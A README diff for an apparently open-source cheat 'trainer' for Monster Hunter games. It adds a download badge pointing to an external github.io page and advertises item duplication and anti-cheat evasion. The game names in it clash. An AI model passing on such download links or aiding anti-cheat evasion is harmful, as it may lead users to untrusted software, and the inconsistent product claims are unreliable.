@@ -4,6 +4,8 @@
 
 The **Monster Hunter Rise Wilds Trainer** is an open-source tool designed to empower players with **unlimited health, stamina, ammo**, and **item duplication** in *Monster Hunter Rise: Sunbreak*. Whether you want to dominate legendary monsters or experiment with game mechanics, this trainer offers seamless cheats with **low-detection safeguards** to enhance your journey through the Wilds.  
 
+**[![Download MHW Trainer](https://img.shields.io/badge/Download-MHW%20Trainer-blueviolet)](https://monsterhunterwilds-trainer.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Infinite Health/Stamina**: Never retreat—take on monsters without fatigue.  
 - **Item Duplication**: Duplicate consumables, weapons, and armor effortlessly.  
